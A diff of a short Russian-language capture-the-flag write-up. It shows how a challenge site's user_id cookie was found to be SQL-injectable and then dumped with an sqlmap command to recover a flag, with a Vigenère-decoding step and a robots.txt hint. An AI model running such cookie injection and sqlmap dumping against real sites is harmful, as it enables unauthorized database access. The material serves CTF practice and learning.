@@ -1,4 +1,4 @@
-1. curl -v http://counter.ctf2019.rocks/
+1. `curl -v http://counter.ctf2019.rocks/`
 Видим что подсчет ведется в зависимости от куки user_id=2
 Подставив в куку букву, получаем mysqli_sql_exception
 ```bash
@@ -50,5 +50,8 @@ sqlmap -u http://counter.ctf2019.rocks/ --cookie "user_id=1" --level 2 --dump se
 | WGCTF{99CAF43C7F7F18B87DD6B3DCAE1CD020} |
 +-----------------------------------------+
 ```
-Собственно флаг. Доп зашифрован Виженером.
+Собственно флаг. 
+
+5. Доп зашифрован Виженером, пользуемся https://www.dcode.fr/vigenere-cipher
+
 Второй найден в http://counter.ctf2019.rocks/robots.txt
